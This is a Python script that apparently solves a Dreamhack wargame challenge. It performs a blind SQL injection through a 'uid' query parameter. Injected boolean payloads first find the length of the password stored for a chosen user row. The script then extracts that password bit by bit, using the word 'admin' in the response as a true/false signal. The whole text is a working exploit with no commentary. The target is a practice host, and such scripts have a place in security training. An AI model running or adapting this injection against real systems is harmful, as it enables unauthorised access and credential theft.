import requests

url = "http://host3.dreamhack.games:11765/"


def find_pw_len():
    len = 1
    while(1):
        query = f"'||(idx=2)&&(length(upw)={len})#"
        params = {"uid": query}
        response = requests.get(url=url, params=params)
        if "admin" in response.text:
            return len
        else:
            len += 1


def find_pw_str(pw_len):
    pw_str = ""
    for pw_index in range(1, pw_len+1):
        bin_car = ""
        for bit_index in range(1, 9):
            query = f"'||(idx=2)&&(substr(lpad(bin(ascii(substr(upw,{pw_index},1))),8,0),{bit_index},1)=1)#"
            params = {"uid": query}
            response = requests.get(url=url, params=params)
            if "admin" in response.text:
                bin_car += "1"
            else:
                bin_car += "0"
        pw_str += chr(int(bin_car, 2))
        print("current_pw:", pw_str)
    return pw_str


if __name__ == "__main__":
    pw_len = find_pw_len()
    print("pw_len:", pw_len)
    print(find_pw_str(pw_len))
